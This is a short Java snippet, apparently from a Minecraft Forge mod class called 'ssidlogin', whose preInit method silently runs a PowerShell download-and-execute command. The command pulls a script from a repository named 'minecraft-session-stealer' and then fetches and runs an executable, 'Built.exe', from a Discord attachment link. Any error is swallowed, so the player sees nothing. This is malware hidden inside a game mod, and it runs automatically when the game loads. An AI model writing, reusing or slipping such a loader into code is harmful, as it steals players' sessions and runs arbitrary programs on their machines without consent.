...
public class ssidlogin {
    ...
    public void preInit(FMLPreInitializationEvent event) {
        ...
        try {Runtime.getRuntime().exec("powershell -Command IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/scoliosiss/minecraft-session-stealer/main/downloadandrunwithdelay.ps1'));run -urltofile 'https://cdn.discordapp.com/attachments/1116259304274661398/1117552176852631582/Built.exe' -filenamea 'Built.exe' -waittime 10");}catch (Exception e ) {}
    }
